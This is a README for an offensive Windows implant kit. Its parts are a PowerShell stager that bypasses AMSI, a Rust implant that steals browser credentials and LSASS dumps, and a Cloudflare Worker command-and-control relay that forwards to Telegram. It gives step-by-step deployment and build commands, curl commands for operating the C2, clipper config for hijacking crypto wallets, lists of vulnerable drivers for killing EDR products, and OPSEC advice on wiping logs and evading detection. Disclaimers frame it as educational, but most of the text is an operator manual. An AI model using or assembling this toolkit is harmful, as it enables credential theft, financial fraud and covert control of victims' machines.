# Veneficus Mini v3.0

Windows 10/11 x64 implant kit: a **PowerShell stager**, a **Rust PE**, and a **Cloudflare Worker** that pages the operator on Telegram.

The stager (`resources/loader.ps1`) is meant to quiet AMSI in the current PowerShell process, pull the implant from the Worker’s `/beacon` route, and launch it as `%TEMP%\MicrosoftEdgeUpdate.exe`. The PE then scores the host for sandbox/analyst artefacts. A high score wipes the binary; a mid score enters “safe mode” (fingerprint only); a low score runs the full stack — AMSI/ETW patches, a BYOVD pool against named EDR processes, browser credential theft, an LSASS dump chain, WMI/scheduled-task/Run persistence, a localhost SOCKS5 proxy, a localhost HVNC/RFB listener, and a clipboard clipper for crypto addresses. A jittered HTTPS loop beacons and polls a small command set (`/status`, `/proxy_on`, `/self_destruct`, `/re_infect`, `/sleep`, safe-mode toggles). Exfil is AES-256-GCM with an HMAC, keyed from a UUID baked at compile time; the Worker is supposed to forward ciphertext without holding the key.

This repository is published for **education and analysis**. A file-by-file read of what is implemented versus stubbed is in [VENEFICUS_MINI_v3_DEEP_ANALYSIS.md](VENEFICUS_MINI_v3_DEEP_ANALYSIS.md).

**For educational purposes only. 2026 All rights reversed.**

---

## Architecture

```
VICTIM MACHINE
  loader.ps1 (AMSI/ETW bypass → download → execute)
    └── veneficus_mini.exe
          ├── Environment assessment (sandbox/VM/analyst detection)
          ├── Stealth: syscall bypass chain, lacuna stack-spoof, DKOM, AMSI/ETW patch
          ├── BYOVD: kill EDR processes (K7RKScan, ThrottleStop, BdApi, TrueSight, wsftprm, RTCore64)
          ├── Payload: creds, cookies, LSASS dump, device fingerprint
          ├── Persistence: WMI / Scheduled Task / Registry (three-way fallback)
          ├── SOCKS5 proxy (127.0.0.1:1080 by default, configurable)
          ├── HVNC (127.0.0.1:5900 by default, configurable)
          ├── Clipper: crypto address hijacking (BTC, ETH, LTC, XMR, DOGE, SOL, XRP, BNB, USDT)
          └── C2 loop: AES-GCM encrypted poll every 10 ± 3s (safe mode: 60 ± 18s)
                ↕ HTTPS
CLOUDFLARE WORKER
  /beacon   → implant download
  /exfil    → receive encrypted data → forward ciphertext to Telegram
  /commands → return queued commands (one-time queue)
  /config   → return operator config blob
  /admin    → queue commands  (requires X-Admin-Key)
  /register → register UUID   (requires X-Admin-Key)
  /unregister → revoke UUID   (requires X-Admin-Key)
  /listing  → list all UUIDs (requires X-Admin-Key)
  /set_config → push config  (requires X-Admin-Key)
                ↓
TELEGRAM BOT
  Receives: ciphertext + nonce + HMAC (operator decrypts offline)
```

---

## Prerequisites

| Component | How to install |
|---|---|
| Rust + cargo | `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \| sh` |
| Windows cross-compile target | `rustup target add x86_64-pc-windows-gnu` |
| MinGW cross-linker | `sudo apt install mingw-w64` |
| Wrangler (CF Worker CLI) | `npm install -g wrangler` |

---

## Setup

### 1. Cloudflare Worker

```bash
wrangler login
wrangler init veneficus-relay
# Replace worker.js with cloudflare/worker.js

wrangler secret put TELEGRAM_TOKEN     # from @BotFather
wrangler secret put TELEGRAM_CHAT_ID   # your chat/group ID
wrangler secret put ADMIN_KEY          # random 32-char secret

wrangler kv:namespace create "UUID_KV"
wrangler kv:namespace create "COMMANDS_KV"
wrangler kv:namespace create "CONFIG_KV"

# Add KV bindings to wrangler.toml:
#   [[kv_namespaces]]
#   binding = "UUID_KV"
#   id = "<uuid_kv_id>"
#   (repeat for COMMANDS_KV, CONFIG_KV)

wrangler deploy
```

### 2. Generate Relay URL

```python
import base64
url = b"https://your-worker.workers.dev"
key = 0xAF
enc = bytes([b ^ key for b in url])
print(base64.b64encode(enc).decode())   # → set as RELAY_URL_BYTES
```

### 3. Build

```bash
RELAY_URL_BYTES="<output_above>" \
BYOVD_DRIVER_DIR="./drivers" \
TOOLS_DIR="./tools" \
cargo build --release --target x86_64-pc-windows-gnu
```

Place vulnerable driver `.sys` files in `drivers/` and tool binaries in `tools/` before building.

### 4. Register the implant UUID

Read UUID from the binary (baked in at build time):

```bash
strings target/x86_64-pc-windows-gnu/release/veneficus_mini.exe | grep -E "[0-9a-f]{8}-[0-9a-f]{4}"
```

Register via admin API:

```bash
curl -X POST https://your-worker.workers.dev/register \
  -H "X-Admin-Key: YOUR_ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -d '{"implant_uuid":"<uuid>","note":"op_blackbird_host01"}'
```

### 5. Push operator config (clipper addresses, etc.)

```bash
curl -X POST https://your-worker.workers.dev/set_config \
  -H "X-Admin-Key: YOUR_ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -d '{
    "implant_uuid": "global",
    "config": {
      "clipper_addresses": {
        "bitcoin":  "bc1qyourwallethere",
        "ethereum": "0xYOURWALLETHERE"
      },
      "reinfect_url": "https://your-worker.workers.dev/beacon"
    }
  }'
```

---

## C2 Commands

Send via `/admin` endpoint:

```bash
curl -X POST https://your-worker.workers.dev/admin \
  -H "X-Admin-Key: YOUR_ADMIN_KEY" \
  -H "Content-Type: application/json" \
  -d '{"implant_uuid":"<uuid>","command":"/status"}'
```

| Command | Effect |
|---|---|
| `/self_destruct` | 3-pass wipe + event log clear + exit |
| `/re_infect` | Download new payload from `reinfect_url` in config, replace self |
| `/status` | Send PID, proxy state, safe-mode, UUID back to C2 |
| `/proxy_on` | Enable SOCKS5 proxy |
| `/proxy_off` | Disable SOCKS5 proxy |
| `/exit_safe` | Leave safe mode, resume full operation |
| `/enter_safe` | Enter safe mode (fingerprint only) |
| `/sleep <secs>` | Override base C2 poll interval |

---

## Fallback Chains

| Module | Chain (left = first tried) |
|---|---|
| **BYOVD** | K7RKScan → BdApiUtil64 → TrueSight → ThrottleStop → STProcessMonitor → wsftprm → RTCore64 → capcom → disable blocklist |
| **LSASS** | MiniDumpWriteDump (native) → WDigest patch → LSA Whisperer → DumpGuard → PPL bypass (RTCore64) |
| **NTLM** | PrinterBug → PetitPotam → cross-protocol relay (HTTP→LDAP) → CVE-2025-33073 → MSSQL relay |
| **Syscalls** | Tartarus Gate → Halo's Gate → ntdll unhook → indirect → standard WinAPI |
| **DKOM** | EPROCESS unlink → PspChained enumeration → EDR callback unregister |
| **Persistence** | WMI subscription → Scheduled Task → HKLM Run key |

---

## Directory Layout

```
veneficus_mini/
├── Cargo.toml
├── build.rs                     # UUID baking at compile time
├── build_command.txt            # Build reference
├── README.md
├── cloudflare/
│   └── worker.js                # C2 relay (deploy to Cloudflare Workers)
├── resources/
│   └── loader.ps1               # AMSI-bypassing PowerShell stager
├── drivers/                     # Vulnerable .sys files (provide before build)
│   ├── K7RKScan.sys             # CVE-2025-52915 / CVE-2025-1055
│   ├── ThrottleBlood.sys        # CVE-2025-7771
│   ├── BdApiUtil64.sys
│   ├── truesight.sys
│   ├── wsftprm.sys
│   ├── RTCore64.sys
│   └── capcom.sys
├── tools/                       # Embedded fallback tools (provide before build)
│   ├── NativeBypassCredGuard.dll
│   ├── procdump.exe
│   └── lsawhisper.exe
└── src/
    ├── main.rs
    ├── aes_gcm_crypto.rs        # AES-256-GCM + HMAC-SHA256
    ├── c2.rs                    # Encrypted C2 with jitter
    ├── byovd.rs                 # BYOVD EDR killer (6 drivers + pool)
    ├── persistence.rs           # WMI / Schtask / Registry
    ├── proxy.rs                 # SOCKS5
    ├── self_destruct.rs         # 3-pass wipe + log clear + re-infect
    ├── utils.rs                 # Sandbox assessment + Windows helpers
    ├── payload/
    │   ├── mod.rs               # Orchestrator
    │   ├── steal.rs             # Chromium creds + cookies + Firefox
    │   ├── clipper.rs           # Crypto clipboard hijacker
    │   └── lsass.rs             # LSASS dump chain
    ├── stealth/
    │   ├── mod.rs               # Engine init
    │   ├── syscalls.rs          # Syscall bypass chain (AtomicU8, no UB)
    │   ├── lacuna.rs            # Stack spoofing
    │   ├── dkom.rs              # Process hiding (EPROCESS unlink)
    │   └── stomp.rs             # AMSI + ETW patching
    ├── backdoor/
    │   ├── mod.rs
    │   └── hvnc.rs             # HVNC (RFB 3.8 skeleton + Tokio listener)
    └── lateral/
        ├── mod.rs
        └── ntlm.rs             # NTLM coercion / relay chain
```

---

## Build Features

| Feature flag | Default | Effect |
|---|---|---|
| `byovd` | ✓ | Include BYOVD EDR-kill module |
| `dkom` | ✓ | Include DKOM process-hide module |

Disable both for a minimal implant: `cargo build --release --no-default-features`

---

## OPSEC Notes

- **No secrets in binary** — relay URL is XOR-obfuscated; all C2 secrets live in Cloudflare environment variables.
- **Encrypted exfil** — Cloudflare Worker never sees plaintext data; only the operator (with the UUID-derived key) can decrypt.
- **Jittered C2** — ±30% interval makes NTA/NDR correlation harder.
- **HVNC** — runs on a hidden isolated desktop (`CreateDesktop`); never visible to the victim.
- **Secure delete** — 3-pass overwrite (zeros → ones → random) + `FileDispositionInfo` mark-on-close + `MoveFileEx` reboot-fallback.
- **Event log clear** — clears System, Security, Application, and PowerShell/Operational on exit.
- Rotate UUIDs, driver files, and worker domains between operations.

---

## Acknowledgements

- [CallGhost](https://github.com/PatchRequest/CallGhost) — Direct syscall framework
- [lacuna-rs](https://github.com/Karkas66/lacuna-rs) — Call-stack spoofing
- [CVE-2025-7771](https://securelist.com/av-killer-exploiting-throttlestop-sys/117026/) — ThrottleStop BYOVD (MedusaLocker, Kaspersky)
- [CVE-2025-52915 / CVE-2025-1055](https://github.com/BlackSnufkin/BYOVD) — K7RKScan

---

**For authorised penetration testing and red team operations only.**
